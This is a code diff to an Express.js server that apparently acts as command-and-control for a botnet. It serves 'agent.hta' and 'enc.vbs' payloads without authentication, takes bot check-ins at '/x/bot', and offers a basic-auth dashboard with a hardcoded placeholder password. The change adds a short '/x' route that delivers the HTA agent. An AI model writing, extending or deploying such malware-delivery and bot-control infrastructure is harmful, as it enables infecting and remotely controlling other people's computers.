@@ -8,34 +8,35 @@ const dashboardRoutes = require('./routes/dashboard');
 
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Static files (public) – NO AUTH needed for agent.hta, enc.vbs
+// Static files (still serves /agent.hta, /enc.vbs, /dashboard.html, etc.)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Dashboard login credentials
+// Dashboard login protection
 const dashboardUser = 'admin';
 const dashboardPass = 'YourStrongPassword123!';   // CHANGE THIS
 
-// Protect ALL /api and /dashboard routes
 app.use(['/api', '/dashboard'], basicAuth({
     users: { [dashboardUser]: dashboardPass },
     challenge: true,
     realm: 'Dashboard'
 }));
 
-// Routes
-app.use('/x/bot', apiRoutes);           // Bot check‑in (public – see below for optional secret)
-app.use('/api', dashboardRoutes);       // Dashboard REST API (protected)
+// --- New route: serve agent.hta at /x ---
+app.get('/x', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'agent.hta'));
+});
 
-// Dashboard frontend
+// Existing routes
+app.use('/x/bot', apiRoutes);
+app.use('/api', dashboardRoutes);
+
 app.get('/dashboard', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
 
-// Start server
 app.listen(config.PORT, () => {
     console.log(`Server running on port ${config.PORT}`);
 });
